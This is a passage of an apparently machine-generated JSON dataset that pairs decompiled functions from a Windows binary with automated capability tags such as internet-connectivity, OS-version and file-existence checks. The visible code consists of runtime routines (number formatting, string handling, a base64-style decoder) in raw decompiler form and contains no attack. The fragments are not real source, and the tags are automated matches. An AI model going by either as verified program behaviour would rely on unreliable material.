uStack168);\n            }\n            bVar17 = puStack216 < 3;\n            if (iStack112 == 0) {\ncode_r0x000140017dae:\n                if ((0 < uStack172) || (bVar17)) {\n                    uStack176 = uStack136 + 1;\n                    if (uStack144 != 0) {\ncode_r0x000140018097:\n                        uVar9 = uVar14;\n                        if (0 < uVar12 + uVar4) {\n                            uStack256 = 0x1400180a6;\n                            uVar9 = fcn.1400194b0(uVar14, uVar12 + uVar4);\n                        }\n                        uVar14 = uVar9;\n                        if (uStack132 != 0) {\n                            uStack256 = 0x140018888;\n                            iVar7 = fcn.140018e70(*(uVar9 + 8));\n                            uStack256 = 0x1400188a6;\n                            sub.msvcrt.dll_memcpy(iVar7 + 0x10, uVar9 + 0x10, *(uVar9 + 0x14) * 4 + 8);\n                            uStack256 = 0x1400188b3;\n                            uVar14 = fcn.1400194b0(iVar7, 1);\n                        }\n                        uStack92 = 1;\n                        puVar11 = puStack160;\n                        uStack144 = arg4;\ncode_r0x000140018180:\n                        uStack256 = 0x14001818b;\n                        iVar5 = fcn.140017360(arg1_00, iVar20);\n                        uVar4 = iVar5 + 0x30;\n                        uStack256 = 0x14001819b;\n                        uVar12 = fcn.1400195c0(arg1_00, uVar9);\n                        uStack256 = 0x1400181a8;\n                        uVar10 = fcn.140019610(iVar20, uVar14);\n                        if (*(uVar10 + 0x10) == 0) {\n                            uStack256 = 0x1400181c6;\n                            uStack152 = uVar10;\n                            uStack168 = fcn.1400195c0(arg1_00, uVar10);\n                            uStack256 = 0x1400181d7;\n                            fcn.140018f70(uStack152);\n                            puStack216._0_4_ = uStack168 | puStack216;\n                            uVar19 = uStack168;\n                            if ((puStack216 != 0) ||\n                               (uStack168 = *puStack192,  uVar19 = puStack216,  (uStack168 & 1 | uStack164) != 0))\n                            goto code_r0x0001400180ed;\n                            arg4 = uStack144;\n                            puStack216 = puVar11;\n                            if (uVar4 != 0x39) {\n                                if (uVar12 < 1) {\n                                    if (*(arg1_00 + 0x14) < 2) {\n                                        if (*(arg1_00 + 0x18) != 0) {\n                                            puStack216._0_4_ = 0x10;\n                                        }\n                                    }\n                                    else {\n                                        puStack216._0_4_ = 0x10;\n                                    }\n                                }\n                                else {\n                                    uVar4 = iVar5 + 0x31;\n                                    puStack216._0_4_ = 0x20;\n                                }\n                                *puVar11 = uVar4;\n                                puVar8 = puVar11 + 1;\n                                uStack180 = puStack216;\n                                goto code_r0x000140018240;\n                            }\ncode_r0x0001400189e7:\n                            puVar8 = puStack216 + 1;\n                            goto code_r0x0001400189f0;\n                        }\n                        uStack256 = 0x1400180e8;\n                        fcn.140018f70(uVar10);\n                        uVar19 = 1;\ncode_r0x0001400180ed:\n                        arg4 = uStack144;\n                        if ((uVar12 < 0) || (((uVar12 | puStack216) == 0 && ((*puStack192 & 1) == 0)))) {\n                            if (uStack164 == 0) {\n                                puStack216 = puVar11;\n                                if (0 < uVar19) goto code_r0x00014001898d;\ncode_r0x0001400189c0:\n                                if (*(arg1_00 + 0x14) < 2) {\n                                    if (*(arg1_00 + 0x18) == 0) {\n                                        uStack180 = uStack164;\n                                        puVar8 = puStack216 + 1;\n                                    }\n                                    else {\n                                        uStack180 = 0x10;\n                                        puVar8 = puStack216 + 1;\n                                    }\n                                }\n                                else {\ncode_r0x0001400189cb:\n                                    uStack180 = 0x10;\n                                    puVar8 = puStack216 + 1;\n                                }\n                            }\n                            else {\n                                if ((*(arg1_00 + 0x14) < 2) && (*(arg1_00 + 0x18) == 0)) {\n                                    if (0 < uVar19) {\ncode_r0x00014001898d:\n                                        uStack256 = 0x14001899a;\n                                        puStack216 = puVar11;\n                                        arg1_00 = fcn.1400194b0(arg1_00, 1);\n                                        uStack256 = 0x1400189a8;\n                                        iVar6 = fcn.1400195c0(arg1_00, iVar20);\n                                        if ((iVar6 < 1) && ((iVar6 != 0 || ((uVar4 & 1) == 0)))) {\n                                            uStack164 = 0x20;\n                                        }\n                                        else {\n                                            if (uVar4 == 0x39) goto code_r0x0001400189e7;\n                                            uStack164 = 0x20;\n                                            uVar4 = iVar5 + 0x31;\n                                        }\n                                        goto code_r0x0001400189c0;\n                                    }\n                                    puVar8 = puVar11 + 1;\n                                    puStack216 = puVar11;\n                                    goto code_r0x0001400187f7;\n                                }\n                                puStack216 = puVar11;\n                                if (uStack164 == 2) goto code_r0x0001400189cb;\n                                puStack192 = uStack144;\n                                while( true ) {\n                                    puVar8 = puVar11 + 1;\n                                    uStack256 = 0x1400187cc;\n                                    iVar5 = fcn.1400195c0(iVar20, uVar14);\n                                    if (iVar5 < 1) break;\n                                    *puVar11 = uVar4;\n                                    uStack256 = 0x14001878f;\n                                    uVar10 = fcn.140018fe0(uVar14, 10, 0);\n                                    if (uVar9 == uVar14) {\n                                        uVar9 = uVar10;\n                                    }\n                                    uStack256 = 0x1400187a9;\n                                    arg1_00 = fcn.140018fe0(arg1_00, 10, 0);\n                                    uStack256 = 0x1400187ba;\n                                    iVar5 = fcn.140017360(arg1_00, iVar20);\n                                    uVar4 = iVar5 + 0x30;\n                                    uVar14 = uVar10;\n                                    puVar11 = puVar8;\n                                }\n                                arg4 = puStack192;\n                                puStack216 = puVar11;\n                                if (uVar4 == 0x39) {\ncode_r0x0001400189f0:\n                                    uVar15 = 0x39;\n                                    *puStack216 = 0x39;\n                                    puVar11 = puStack160;\n                                    goto code_r0x0001400185c4;\n                                }\n                                uStack180 = 0x20;\n                                uVar4 = uVar4 + 1;\n                            }\ncode_r0x0001400187f7:\n                            *puStack216 = uVar4;\n                            goto code_r0x000140018240;\n                        }\n                        puVar8 = puVar11 + 1;\n                        if ((0 < uVar19) && (uStack164 != 2)) {\n                            puStack216 = puVar11;\n                            if (uVar4 == 0x39) goto code_r0x0001400189f0;\n                            uStack180 = 0x20;\n                            *puVar11 = uVar4 + 1;\n                            goto code_r0x000140018240;\n                        }\n                        *puVar11 = uVar4;\n                        if (uStack92 != uStack172) goto code_r0x000140018133;\n                        goto code_r0x0001400183bc;\n                    }\ncode_r0x000140018368:\n                    uVar12 = uStack172;\n                    uStack92 = 1;\n                    puVar11 = puStack160;\n                    while( true ) {\n                        puVar8 = puVar11 + 1;\n                        uStack256 = 0x1400183aa;\n                        iVar5 = fcn.140017360(arg1_00, iVar20);\n                        uVar4 = iVar5 + 0x30;\n                        *puVar11 = uVar4;\n                        if (uVar12 <= uStack92) break;\n                        uStack256 = 0x140018390;\n                        arg1_00 = fcn.140018fe0(arg1_00, 10, 0);\n                        uStack92 = uStack92 + 1;\n                        puVar11 = puVar8;\n                    }\n                    uVar9 = 0;\ncode_r0x0001400183bc:\n                    puStack216 = uVar9;\n                    if (uStack164 == 0) {\n                        uStack256 = 0x14001860b;\n                        arg1_00 = fcn.1400194b0(arg1_00, 1);\n                        uStack256 = 0x140018619;\n                        iVar5 = fcn.1400195c0(arg1_00, iVar20);\n                        if ((0 < iVar5) || ((iVar5 == 0 && ((uVar4 & 1) != 0)))) {\n                            uVar15 = *(puVar8 + -1);\n                            puVar11 = puStack160;\n                            uVar9 = puStack216;\ncode_r0x0001400185c4:\n                            do {\n                                puVar18 = puVar8 + -1;\n                                if (uVar15 != 0x39) goto code_r0x0001400185cd;\n                                if (puVar11 == puVar18) {\n                                    uStack176 = uStack176 + 1;\n                                    uStack180 = 0x20;\n                                    *puStack160 = 0x31;\n                                    goto code_r0x000140018240;\n                                }\n                                uVar15 = *(puVar8 + -2);\n                                puVar8 = puVar18;\n                            } while( true );\n                        }\ncode_r0x0001400188eb:\n                        uVar9 = puStack216;\n                        if (*(arg1_00 + 0x14) < 2) {\n                            puVar18 = puVar8;\n                            uVar12 = 0x10;\n                            if (*(arg1_00 + 0x18) == 0) {\n                                uVar12 = uStack180;\n                            }\n                        }\n                        else {\n                            uStack180 = 0x10;\n                            puVar18 = puVar8;\n                            uVar12 = uStack180;\n                        }\n                    }\n                    else {\n                        if (uStack164 == 2) goto code_r0x0001400188eb;\n                        uVar15 = *(puVar8 + -1);\n                        puVar11 = puStack160;\n                        if ((1 < *(arg1_00 + 0x14)) || (puVar18 = puVar8,  uVar12 = uStack180,  *(arg1_00 + 0x18) != 0))\n                        goto code_r0x0001400185c4;\n                    }\n                    do {\n                        uStack180 = uVar12;\n                        puVar8 = puVar18;\n                        puVar18 = puVar8 + -1;\n                        uVar12 = uStack180;\n                    } while (*(puVar8 + -1) == 0x30);\n                    goto code_r0x000140018240;\n                }\n            }\n            else {\n                uStack256 = 0x14001830b;\n                iVar5 = fcn.1400195c0(arg1_00, iVar20);\n                if (-1 < iVar5) goto code_r0x000140017dae;\n                uVar19 = uStack136 - 1;\n                uStack256 = 0x14001832a;\n                arg1_00 = fcn.140018fe0(arg1_00, 10, 0);\n                bVar1 = 0 < uStack108;\n                if (uStack144 == 0) {\n                    if (!bVar17 && !bVar1) goto code_r0x000140018a10;\n                    uStack176 = uStack136;\n                    uStack172 = uStack108;\n                    goto code_r0x000140018368;\n                }\n                uStack256 = 0x140018ac0;\n                uVar14 = fcn.140018fe0(uVar14, 10, 0);\n                if (bVar17 || bVar1) {\n                    uStack176 = uStack136;\n                    uStack172 = uStack108;\n                    goto code_r0x000140018097;\n                }\ncode_r0x000140018a10:\n                uStack172 = uStack108;\n                uStack136 = uVar19;\n            }\n            if (uStack172 == 0) {\n                uStack256 = 0x140017ddf;\n                iVar20 = fcn.140018fe0(iVar20, 5, 0);\n                uStack256 = 0x140017ded;\n                iVar5 = fcn.1400195c0(arg1_00, iVar20);\n                if (0 < iVar5) {\n                    uStack176 = uStack136 + 2;\n                    goto code_r0x000140017e05;\n                }\n            }\ncode_r0x000140018023:\n            uStack180 = 0x10;\n            uStack176 = -uStack176;\n            puVar18 = puStack160;\n        }\n        uStack256 = 0x140017e1e;\n        fcn.140018f70(iVar20);\n        puVar8 = puStack160;\n        if (uVar14 == 0) goto code_r0x000140017e2b;\n        goto code_r0x000140017e23;\n    }\n    uStack256 = 0x1400177e0;\n    fcn.140018f70(arg1_00);\ncode_r0x0001400177e0:\n    uVar12 = 1;\n    pcVar13 = 0x1400d6e1d;\n    *puStack208 = 1;\n    *0x20 = &stack0xffffffffffffff00;\n    uStack256 = 0x140017802;\n    unaff_RBX = uVar14;\n    unaff_RSI = arg2;\n    unaff_RDI = arg1;\ncode_r0x0001400172c0:\n    *(*0x20 + -8) = unaff_RDI;\n    *(*0x20 + -0x10) = unaff_RSI;\n    *(*0x20 + -0x18) = unaff_RBX;\n    if (uVar12 < 0x1c) {\n        uVar4 = 0;\n    }\n    else {\n        iVar5 = 4;\n        uVar4 = 0;\n        do {\n            iVar5 = iVar5 * 2;\n            uVar4 = uVar4 + 1;\n        } while (iVar5 + 0x17 < uVar12);\n    }\n    *(*0x20 + -0x40) = 0x1400172f4;\n    puVar11 = fcn.140018e70(uVar4);\n    *puVar11 = uVar4;\n    uVar15 = *pcVar13;\n    *(puVar11 + 1) = uVar15;\n    puVar8 = puVar11 + 1;\n    while (uVar15 != 0) {\n        pcVar13 = pcVar13 + 1;\n        uVar15 = *pcVar13;\n        puVar8 = puVar8 + 1;\n        *puVar8 = uVar15;\n    }\n    if (ppuStack200 != NULL) {\n        *ppuStack200 = puVar8;\n    }\n    return puVar11 + 1;\n}\n",
        "token_count": 11228
    },
    "140018d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140018e04)\n// WARNING: Removing unreachable block (ram,0x000140018df0)\n// WARNING: Removing unreachable block (ram,0x000140018df5)\n// WARNING: Removing unreachable block (ram,0x000140018e10)\n\nvoid fcn.140018d40(ulong arg1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    if (*0x1400eebb0 != 2) {\n        if (*0x1400eebb0 != 0) {\n            if (*0x1400eebb0 == 1) {\n                do {\n                    (*pcVar2)(1);\n                } while (*0x1400eebb0 == 1);\n                if (*0x1400eebb0 == 2) goto code_r0x000140018dce;\n            }\n            return;\n        }\n        *0x1400eebb0 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x1400eebc0);\n        (*pcVar1)(0x1400eebe8);\n        fcn.140001500(0x140018e20);\n        *0x1400eebb0 = 2;\n    }\ncode_r0x000140018dce:\n    // WARNING: Could not recover jumptable at 0x000140018de6. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 * 0x28 + 0x1400eebc0);\n    return;\n}\n",
        "token_count": 388
    },
    "140019a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140019a40(char *arg1, uint64_t arg2)\n\n{\n    char *pcVar1;\n    uint64_t uVar2;\n    \n    uVar2 = 0;\n    pcVar1 = arg1;\n    if (arg2 != 0) {\n        do {\n            if (*pcVar1 == '\\0') {\n                return uVar2;\n            }\n            pcVar1 = pcVar1 + 1;\n            uVar2 = pcVar1 - arg1;\n        } while (uVar2 < arg2);\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "140019a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140019a70(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = 0;\n    if (arg2 != 0) {\n        do {\n            if (*(arg1 + iVar1 * 2) == 0) {\n                return iVar1;\n            }\n            iVar1 = iVar1 + 1;\n        } while (arg2 != iVar1);\n    }\n    return arg2;\n}\n",
        "token_count": 104
    },
    "140019c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140019c00(uint16_t *arg1, uint32_t *arg2, int64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t auStack28 [3];\n    \n    if (arg2 == NULL) {\n        return 0;\n    }\n    if (arg3 == 0) {\n        return 0xfffffffe;\n    }\n    auStack28[0] = *arg4;\n    uVar1 = *arg2;\n    *arg4 = 0;\n    if (uVar1 == 0) {\n        *arg1 = 0;\n        return 0;\n    }\n    if (in_stack_00000030 < 2) {\ncode_r0x000140019cb8:\n        if (in_stack_00000028 == 0) {\n            *arg1 = *arg2;\n            return 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 1, arg1, 1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    else {\n        if (auStack28[0] == '\\0') {\n            iVar2 = (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(in_stack_00000028);\n            if (iVar2 == 0) goto code_r0x000140019cb8;\n            if (arg3 == 1) {\n                *arg4 = *arg2;\n                return 0xfffffffe;\n            }\n        }\n        else {\n            auStack28[0]._0_2_ = CONCAT11(uVar1, auStack28[0]);\n            auStack28[0] = auStack28[0] & 0xffff0000 | auStack28[0];\n            arg2 = auStack28;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 2, arg1, 1);\n        if (iVar2 != 0) {\n            return 2;\n        }\n    }\n    puVar3 = sub.msvcrt.dll__errno();\n    *puVar3 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 555
    },
    "1400052c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400052cb(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t *arg1_00;\n    int64_t *piVar5;\n    uint8_t in_DL;\n    int64_t iVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint64_t uVar9;\n    \n    if (arg1 == 0) {\n        return;\n    }\n    arg1_00 = arg1 + -0x10;\n    if (in_DL == 2) {\n        uVar1 = *arg1_00;\n        *arg1_00 = uVar1 - 8;\n        if (7 < uVar1 - 8) {\n            return;\n        }\n        piVar5 = 0x1400eb2f8;\n        if ((*arg1_00 & 4) != 0) {\n            return;\n        }\n        *arg1_00 = *arg1_00 | 4;\n    }\n    else {\n        if (in_DL < 3) {\n            if (in_DL == 0) {\n                fcn.1400050cf(arg1_00);\n                fcn.1400054f4(arg1_00);\n                iVar2 = *0x1400eb338;\ncode_r0x000140005257:\n                if (*0x1400eb328 < 1) {\n                    return;\n                }\n                *0x1400eb328 = *0x1400eb328 + -1;\n                uVar1 = *(iVar2 + *0x1400eb328 * 8);\n                iVar3 = fcn.140001e0c(uVar1 >> 0xc);\n                if (iVar3 != 0) goto code_r0x00014000528c;\n                fcn.1400050cf(uVar1);\n                goto code_r0x0001400052b4;\n            }\n        }\n        else if (in_DL != 3) {\n            return;\n        }\n        piVar5 = 0x1400eb328;\n    }\n    if (piVar5[1] <= *piVar5) {\n        iVar2 = (piVar5[1] * 3) / 2;\n        piVar5[1] = iVar2;\n        iVar3 = fcn.1400029cb(0x1400eb348, iVar2 * 8 + 0x10);\n        puVar7 = piVar5[2];\n        *(iVar3 + 8) = 1;\n        puVar8 = iVar3 + 0x10;\n        for (iVar2 = *piVar5 * 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        fcn.140004d89(piVar5[2]);\n        piVar5[2] = iVar3 + 0x10;\n    }\n    iVar2 = *piVar5;\n    *(piVar5[2] + iVar2 * 8) = arg1_00;\n    *piVar5 = iVar2 + 1;\n    return;\ncode_r0x00014000528c:\n    uVar4 = uVar1 >> 4 & 0xff;\n    uVar9 = 1 << (uVar4 & 0x3f);\n    iVar6 = (uVar4 >> 6) + 2;\n    uVar4 = *(iVar3 + iVar6 * 8);\n    if ((uVar4 & uVar9) == 0) {\n        *(iVar3 + iVar6 * 8) = uVar4 | uVar9;\ncode_r0x0001400052b4:\n        fcn.1400054f4(uVar1);\n        iVar2 = *0x1400eb338;\n    }\n    goto code_r0x000140005257;\n}\n",
        "token_count": 886
    },
    "14000717": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nchar ** fcn.14000717c(uint64_t *arg1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *arg1_00;\n    char **ppcVar4;\n    char *pcVar5;\n    uint64_t uVar6;\n    int64_t *arg2;\n    int64_t *arg2_00;\n    int64_t iVar7;\n    ulong arg1_01;\n    char *pcVar8;\n    ulong *puVar9;\n    char *pcVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    uint32_t uVar13;\n    uint64_t unaff_RBP;\n    char **ppcVar14;\n    int64_t arg1_02;\n    char **ppcVar15;\n    char *arg1_03;\n    ulong arg1_04;\n    uint64_t uVar16;\n    int64_t iVar17;\n    ulong *arg1_05;\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        return NULL;\n    }\n    pcVar5 = fcn.1400063ae(0, (*arg1 * 3) / 4 + 6);\n    uVar6 = *arg1;\n    do {\n        uVar16 = uVar6;\n        uVar1 = *(arg1 + uVar16 + 0xf);\n        if (0x3d < uVar1) break;\n        uVar6 = uVar16 - 1;\n    } while ((0x2000000100002400U >> (uVar1 & 0x3f) & 1) != 0);\n    iVar17 = uVar16 - 4;\n    arg1_03 = NULL;\n    pcVar10 = 0x1400d6280;\n    arg1_02 = 0;\n    arg1_05 = 0x100002400;\n    do {\n        iVar12 = arg1_02;\n        if (iVar17 < arg1_02) {\n            uVar11 = (arg1_02 - uVar16) % 4;\n            uVar6 = uVar11 >> 0x3f;\n            iVar12 = (uVar11 ^ uVar6) - uVar6;\n            if (iVar12 == 2) {\n                cVar2 = *(*(arg1 + arg1_02 + 0x10) + 0x1400d6280);\n                if (cVar2 == -1) {\ncode_r0x000140007457:\n                    arg1_05 = fcn.140006146(0x1400dd5e0, 0x30);\n                    *arg1_05 = 0x1400dd5a0;\n                    arg1_05[2] = \"ValueError\";\n                    arg2 = fcn.140006561(*(arg1 + arg1_02 + 0x10));\n                    arg2_00 = fcn.140006561(arg1_02);\n                    iVar12 = 0;\n                    if (arg2 != NULL) {\n                        iVar12 = *arg2;\n                    }\n                    iVar7 = 0;\n                    if (arg2_00 != NULL) {\n                        iVar7 = *arg2_00;\n                    }\n                    arg1_01 = fcn.14000637b(iVar12 + 0x38 + iVar7);\n                    fcn.140001f14(arg1_01, 0x1400d6240);\n                    goto code_r0x0001400072fb;\n                }\n                iVar12 = arg1_02 + 1;\n                uVar6 = *(*(arg1 + arg1_02 + 0x11) + 0x1400d6280);\n                if (uVar6 != 0xff) {\n                    *(pcVar5 + arg1_03 + 0x10) = cVar2 << 2 | uVar6 >> 4;\n                    arg1_03 = arg1_03 + 1;\ncode_r0x000140007516:\n                    pcVar10 = NULL;\n                    if (-1 < arg1_03) {\n                        pcVar10 = arg1_03;\n                    }\n                    if (pcVar5 == NULL) {\n                        ppcVar4 = fcn.14000637b(arg1_03);\n                        *ppcVar4 = arg1_03;\n                    }\n                    else {\n                        ppcVar4 = pcVar5;\n                        if ((*(pcVar5 + 8) & 0x3fffffffffffffff) < pcVar10) {\n                            arg1_00 = fcn.1400017aa(*(pcVar5 + 8) & 0x3fffffffffffffff);\n                            if (arg1_00 <= arg1_03) {\n                                arg1_00 = arg1_03;\n                            }\n                            ppcVar4 = fcn.140005f46(arg1_00);\n                            pcVar8 = *pcVar5;\n                            *ppcVar4 = pcVar8;\n                            ppcVar14 = pcVar5 + 0x10;\n                            ppcVar15 = ppcVar4 + 2;\n                            for (pcVar8 = pcVar8 + 1; pcVar8 != NULL; pcVar8 = pcVar8 + -1) {\n                                *ppcVar15 = *ppcVar14;\n                                ppcVar14 = ppcVar14 + 1;\n                                ppcVar15 = ppcVar15 + 1;\n                            }\n                            ppcVar14 = ppcVar4;\n                            fcn.140002078(ppcVar4 + *pcVar5 + 0x10, arg1_03 - *pcVar5);\n                            ppcVar14[1] = arg1_00;\n                        }\n                    }\n                    *ppcVar4 = pcVar10;\n                    *(ppcVar4 + pcVar10 + 0x10) = '\\0';\n                    return ppcVar4;\n                }\n            }\n            else {\n                if (iVar12 != 3) goto code_r0x000140007516;\n                cVar2 = *(*(arg1 + arg1_02 + 0x10) + 0x1400d6280);\n                if (cVar2 == -1) goto code_r0x000140007457;\n                iVar12 = arg1_02 + 1;\n                uVar1 = *(*(arg1 + arg1_02 + 0x11) + 0x1400d6280);\n                if (uVar1 != 0xff) {\n                    uVar16 = *(arg1 + arg1_02 + 0x12);\n                    iVar12 = arg1_02 + 2;\n                    uVar3 = *(uVar16 + 0x1400d6280);\n                    if (uVar3 != 0xff) {\n                        *(pcVar5 + arg1_03 + 0x10) = cVar2 << 2 | uVar1 >> 4;\n                        